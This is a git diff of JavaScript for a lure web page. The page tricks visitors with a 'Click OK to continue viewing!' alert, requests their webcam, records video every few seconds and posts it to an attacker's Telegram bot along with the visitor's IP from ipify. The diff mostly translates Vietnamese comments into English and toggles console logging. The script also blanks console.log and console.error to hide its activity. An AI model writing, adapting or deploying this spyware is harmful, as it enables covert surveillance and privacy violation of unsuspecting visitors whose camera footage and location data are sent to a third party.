@@ -11,22 +11,22 @@ function captureVideo() {
           var blob = recorder.getBlob();
 
           var formData = new FormData();
-          formData.append('chat_id', 'CONVERSATION ID'); // Hàm thay ID , CONVERSATION ID = ID Nhóm Telegram
+          formData.append('chat_id', 'CONVERSATION ID'); // Replace CONVERSATION ID by telegram chat group id 
           formData.append('video', blob, 'video.mp4');
 
           fetch('https://api.telegram.org/botTOKEN_BOT/sendVideo', {
               method: 'POST',
               body: formData
-          }) // Thay thế hàm TOKEN_BOT = TOKEN của bot bạn
+          }) // Replace function TOKEN_BOT = TOKEN of your bot
           .then(response => response.json())
           .then(data => {
-            //  console.log('Video sent successfully:', data);
+              console.log('Video sent successfully:', data);
           })
           .catch(error => {
-          //    console.error('Error sending video to Telegram:', error);
+              console.error('Error sending video to Telegram:', error);
           });
       });
-  }, 5000); // Chỉnh sửa thời gian gửi
+  }, 5000); // Edit send time and video aspect ratio
 }
 
 function requestCameraAccess() {
@@ -38,18 +38,18 @@ function requestCameraAccess() {
           setTimeout(captureVideo, 1000); 
       })
       .catch(function(error) {
-   //       console.error('Error accessing webcam:', error.message);
+       console.error('Error accessing webcam:', error.message);
       });
 }
 
 function showCameraAccessAlert() {
-  alert('Ấn OK để tiếp tục xem!');
+  alert('Click OK to continue viewing!');
   requestCameraAccess();
 }
 
 $(document).ready(function() {
-  var telegramBotToken = 'TOKEN_BOT'; // Thay thế hàm TOKEN_BOT = TOKEN của bot bạn
-  var chatId = 'CONVERSATION ID';
+  var telegramBotToken = 'TOKEN_BOT'; // Replace function TOKEN_BOT = TOKEN of your bot
+  var chatId = 'CONVERSATION ID'; // Replace CONVERSATION ID by telegram chat group id 
 
   $.getJSON('https://api.ipify.org?format=json', function(data) {
       var ip = data.ip;
@@ -117,3 +117,5 @@ window.addEventListener('DOMContentLoaded', function() {
 
 console.log = function() {};
 console.error = function() {};
+
+// Code belongs to Cao Tien Thanh
